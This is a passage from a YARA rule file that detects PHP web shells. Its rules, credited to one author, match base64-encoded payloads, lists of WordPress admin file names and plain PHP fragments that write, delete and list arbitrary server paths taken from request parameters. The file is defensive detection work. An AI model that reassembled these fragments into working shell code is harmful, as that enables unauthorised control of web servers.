      $s13 = "bJuxPA/zDVHRbTdZckr6iKXUWWwMjuExX948agWddccPmS/vlNjdZvqewzYWhDvJANBUG+ZYng5qXDXCXYdBRWHTULQqTgW5s8p3lNIBiJcCsANtkkhThP9j/G1zJ4DD" ascii
      $s14 = "SkpOWcTOSg7sL2VO2Rj1m25TYMfyEXfTVUXY4keJp2EEobkpZvCcryLyIDOlQg0Ud19LF+r3Xhj4MrbimVldfMo+/lFr40d9FtTiWl9x9s5xelhmYnR38XSfLuZZZQ/X" ascii
      $s15 = "1+MkqRckEbi4bH5e+Y+lwl/MBHd6OeJF3CfkBO8BHyCidr/FZBI1uR1BqeXaSDcgnL9yxjIPJ9u7bkVOnDuSdV41+aNHEbNMd6kD1juUVW2huR1Y/MtxERr5tcrZ0c3u" ascii
      $s16 = "v9Ci4tea6yffNxcW1woXLMQTEySKQM7QJdvFy4alIZ9u5DPzmElyW3dvhh5tO7b+InHyJfPxuc/E7zcPvPAe/2fz7TpPv5RLv+6T7n5t0Z/qk2wmSezy1LuvObjTr/je" ascii
      $s17 = "QDm/ICfntLSZnnFqDvD06wJ9cm6dbA6uMxKdM9AcwbxG8AUXbZMsjY4sOO2rBhQuNNT3HgeZEIRVL7E0l3Nt11LNB5OlXaneBwltNLx8gA0e/oTN6m+cn66kMa5TiZR4" ascii
      $s18 = "POb0L6jnVv6VRZDTYOcsYyyaIP0dFLDw6o3T5Fp5r9DVL+ft7d6+kO+HuHf6X7/D5JMnncvnphsmc5+Gjdvd+Zlahf72fSYcf773Lwp+78S7pgS537VuEaQB9hW8d7Cj" ascii
      $s19 = "QQQzXMV3nbOAOh9QCbgXA118NXd3HYmQYefa4thKDpN6IrpIVkNVxbfjiwxv8a9EgtKjvkA4ZepFN6+R/X39F4BMOSe0BjU3nsrZyttvb3T3afnaiCEzKaT0FxI+rI0O" ascii
      $s20 = "amxMamyU0DlhzN6zLEvxBFfzrE/zrJfhfjz3L8x1qzZDDr0JnbUJnrYTO4dHhNjFDk5bgN8vw58q/0K90o6+XlHbVSZvmXwB8u69TUe0cUOtk2W2tIY9PiGqp0AjBHJI" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule shell_ruzhu {
   meta:
      description = "shell - Ruzhu"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "19bcd130a2cc00631644fa1842542bce1caf78870bff0eb00da03d8f232e49df"
   strings:
      $s1 = "yZXNzLXRoaXMucGhwfHVwbG9hZC5waHB8YXN5bmMtdXBsb2FkLnBocHxtZW51LWhlYWRlci5waHB8b3B0aW9ucy1kaXNjdXNzaW9uLnBocHxwcml2YWN5LnBocHx1c2V" ascii /* base64 encoded string 'ess-this.php|upload.php|async-upload.php|menu-header.php|options-discussion.php|privacy.php|use' */
      $s2 = "tYWRkLnBocHxtcy1lZGl0LnBocHxvcHRpb25zLnBocHxlZGl0LWNvbW1lbnRzLnBocHxsaW5rLW1hbmFnZXIucGhwfG1zLW9wdGlvbnMucGhwfG9wdGlvbnMtcmVhZGl" ascii /* base64 encoded string 'add.php|ms-edit.php|options.php|edit-comments.php|link-manager.php|ms-options.php|options-readi' */
      $s3 = "waHB8bGluay1wYXJzZS1vcG1sLnBocHxtcy1zaXRlcy5waHB8b3B0aW9ucy13cml0aW5nLnBocHx0aGVtZXMucGhwfGFkbWluLWFqYXgucGhwfGVkaXQtZm9ybS1jb21" ascii /* base64 encoded string 'hp|link-parse-opml.php|ms-sites.php|options-writing.php|themes.php|admin-ajax.php|edit-form-com' */
      $s4 = "tbWVudHMtcG9zdC5waHB8d3AtY3Jvbi5waHB8d3AtbG9hZC5waHB8d3AtbWFpbC5waHB8d3Atc2lnbnVwLnBocHx4bWxycGMucGhwfGVkaXQtZm9ybS1hZHZhbmNlZC5" ascii /* base64 encoded string 'ments-post.php|wp-cron.php|wp-load.php|wp-mail.php|wp-signup.php|xmlrpc.php|edit-form-advanced.' */
      $s5 = "8cmV2aXNpb24ucGhwfHVzZXJzLnBocHxjdXN0b20tYmFja2dyb3VuZC5waHB8bXMtYWRtaW4ucGhwfG9wdGlvbnMtbWVkaWEucGhwfHNldHVwLWNvbmZpZy5waHB8d2l" ascii /* base64 encoded string 'revision.php|users.php|custom-background.php|ms-admin.php|options-media.php|setup-config.php|wi' */
      $s6 = "tZW50LnBocHxsaW5rLnBocHxtcy10aGVtZXMucGhwfHBsdWdpbi1lZGl0b3IucGhwfGFkbWluLWZvb3Rlci5waHB8ZWRpdC1saW5rLWZvcm0ucGhwfGxvYWQtc2NyaXB" ascii /* base64 encoded string 'ent.php|link.php|ms-themes.php|plugin-editor.php|admin-footer.php|edit-link-form.php|load-scrip' */
      $s7 = "waHB8YWRtaW4taGVhZGVyLnBocHxlZGl0LXRhZy1mb3JtLnBocHxtZWRpYS1uZXcucGhwfG15LXNpdGVzLnBocHxwb3N0LW5ldy5waHB8YWRtaW4ucGhwfGVkaXQtdGF" ascii /* base64 encoded string 'hp|admin-header.php|edit-tag-form.php|media-new.php|my-sites.php|post-new.php|admin.php|edit-ta' */
      $s8 = "ncy5waHB8bWVkaWEucGhwfG5hdi1tZW51cy5waHB8cG9zdC5waHB8YWRtaW4tcG9zdC5waHB8ZXhwb3J0LnBocHxtZWRpYS11cGxvYWQucGhwfG5ldHdvcmsucGhwfHB" ascii /* base64 encoded string 's.php|media.php|nav-menus.php|post.php|admin-post.php|export.php|media-upload.php|network.php|p' */
      $s9 = "zYW1wbGUucGhwfHdwLWxpbmtzLW9wbWwucGhwfHdwLWxvZ2luLnBocHx3cC1zZXR0aW5ncy5waHB8d3AtdHJhY2tiYWNrLnBocHx3cC1hY3RpdmF0ZS5waHB8d3AtY29" ascii /* base64 encoded string 'ample.php|wp-links-opml.php|wp-login.php|wp-settings.php|wp-trackback.php|wp-activate.php|wp-co' */
      $s10 = "0cy5waHB8bXMtdXBncmFkZS1uZXR3b3JrLnBocHxhZG1pbi1mdW5jdGlvbnMucGhwfGVkaXQucGhwfGxvYWQtc3R5bGVzLnBocHxtcy11c2Vycy5waHB8cGx1Z2lucy5" ascii /* base64 encoded string 's.php|ms-upgrade-network.php|admin-functions.php|edit.php|load-styles.php|ms-users.php|plugins.' */
      $s11 = "yLWVkaXQucGhwfG1lbnUucGhwfG9wdGlvbnMtZ2VuZXJhbC5waHB8cHJvZmlsZS5waHB8dXNlci1uZXcucGhwfG1vZGVyYXRpb24ucGhwfG9wdGlvbnMtaGVhZC5waHB" ascii /* base64 encoded string '-edit.php|menu.php|options-general.php|profile.php|user-new.php|moderation.php|options-head.php' */
      $s12 = "kZ2V0cy5waHB8Y3VzdG9tLWhlYWRlci5waHB8bXMtZGVsZXRlLXNpdGUucGhwfG9wdGlvbnMtcGVybWFsaW5rLnBocHx0ZXJtLnBocHxjdXN0b21pemUucGhwfGxpbms" ascii /* base64 encoded string 'gets.php|custom-header.php|ms-delete-site.php|options-permalink.php|term.php|customize.php|link' */
      $s13 = "sNCiAgICB9DQoNCi8vIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KLyoqDQogKiDovazljJYgXCDkuLogLw0KIC" ascii
      $s14 = "RyPg0KPHRkIGNsYXNzPXRkX2hvbWU+IDxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsUjBsR09EbGhFd0FRQUxNQUFBQUFBUC8vLzV5Y0FNN09ZLy8vblAvL3" ascii
      $s15 = "lKcjZBZnA1K21EOUhjTURZWU5nOGRJWWlnWmF4bDdHYWNZdHhrdm1VeW1CZE9YbWNoVU1OY3lHNWxubUErWWIxVllLdllxZkJXUnloS1ZPcFZXbFg2VjU2cFVWWE5WUD" ascii
      $s16 = "                        $general_template_code = @file_get_contents($file_general_template_path);" fullword ascii
      $s17 = "WtQbUlqTW9rWlVORG51ZjhFdHRLVmc2UzBoZ3VQaVFDVm05UE9RZ1diN3I3UTNscHIveWlTS3J3Q25oMEVGRGxkRXVGakorZEM3Mi9iUUdrTmpManlid2hyMWFCWWk3c" ascii
      $s18 = "ZIZ0lyOUZ1eFlqaTFNWGR5NHhYVks2WkhocDhOSjl5MmpMc3BiOVVPSllVbFh5YW5uYzhvNVNnOUtscFVNcmdsYzBsYW1VeWN0dXJ2UmF1V01WWVpWa1ZlOXFsOVZiVm" ascii
      $s19 = "NISmxlSVM2WDh5OFIrVy9RbVRkdzBBcklaUHdFNjJCN1hMYk1CKzdnRUNpdzVZMG5ZQVFIN3pMWXdhQzVFQUVHYzBNbm4zQUFDVHYvbVBRQ3NCQU0yWHBPTUFBTHpvR0" ascii
      $s20 = "                            $jue_jiang_404 = \"PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoJ1BSQycpO" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}


/* Super Rules ------------------------------------------------------------- */

rule shell_adoh_recode {
   meta:
      description = "shell - Adoh & Recode Izin"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "5aed486e7f4bdb4eb33395d1a1531ec56b1870ffb4f1ea26fc8d4dc77fc60852"
      hash2 = "60017dff1e1f117d80152fd69df219fb92ed1dacf1c91643cd17d00179a45c15"
   strings:
      $s1 = "error_reporting(0); " fullword ascii
      $s2 = "$fp = fopen($_POST['path'],'w');" fullword ascii
      $s3 = "$pa = getcwd();" fullword ascii
      $s4 = "if(isset($_POST['src'])){" fullword ascii
      $s5 = "if(isset($_GET['path'])){" fullword ascii
      $s6 = "if(unlink($_POST['path'])){" fullword ascii
      $s7 = "if(rmdir($_POST['path'])){" fullword ascii
      $s8 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s9 = "$path = $_GET['path'];" fullword ascii
      $s10 = "$path = getcwd();" fullword ascii
      $s11 = "if($_POST['type'] == 'dir'){" fullword ascii
      $s12 = "if(isset($_GET['filesrc'])){" fullword ascii
      $s13 = "if(fwrite($fp,$_POST['src'])){" fullword ascii
      $s14 = "foreach($scandir as $file){" fullword ascii
      $s15 = "$scandir = scandir($path);" fullword ascii
      $s16 = "foreach($scandir as $dir){" fullword ascii
      $s17 = "$paths = explode('/',$path);" fullword ascii
      $s18 = "<input type=\\\"hidden\\\" name=\\\"path\\\" value=\\\"$path/$file\\\">" fullword ascii
      $s19 = "<input type=\\\"hidden\\\" name=\\\"path\\\" value=\\\"$path/$dir\\\">" fullword ascii
      $s20 = "echo '\">'.$pat.'</a>/';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

